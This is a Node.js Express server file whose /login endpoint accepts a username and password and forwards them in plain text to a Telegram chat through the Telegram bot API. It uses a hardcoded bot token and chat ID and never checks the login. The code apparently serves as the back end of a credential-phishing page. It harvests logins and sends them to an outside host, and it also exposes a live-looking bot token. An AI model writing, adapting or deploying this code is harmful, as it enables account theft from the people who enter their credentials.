const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express();
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = "7673803088:AAG9rjdWcAG-oymhFsQrUYD_RLMDSOLDt3I";
const TELEGRAM_CHAT_ID = "7760612629";

app.post("/login", async (req, res) => {
    const { username, password } = req.body;

    // Send credentials to Telegram
    const message = `🔑 New Login Attempt:\n👤 Username: ${username}\n🔒 Password: ${password}`;
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    });

    res.send("Login submitted!");
});

app.listen(3000, () => console.log("Server running on port 3000"));
